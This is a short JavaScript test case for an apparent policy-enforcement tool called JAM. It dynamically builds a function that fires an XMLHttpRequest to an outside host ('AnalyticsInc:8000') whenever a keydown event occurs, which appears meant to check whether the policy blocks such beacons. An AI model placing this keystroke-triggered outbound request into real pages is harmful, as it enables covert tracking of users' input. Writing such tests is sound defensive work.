
JAM.startProfile('load');
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeydown2", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
var v1 = Function(exp);
introspect(JAM.policy.p1) {
  v0.addEventListener("keydown", v1, false);
}

JAM.stopProfile('load');
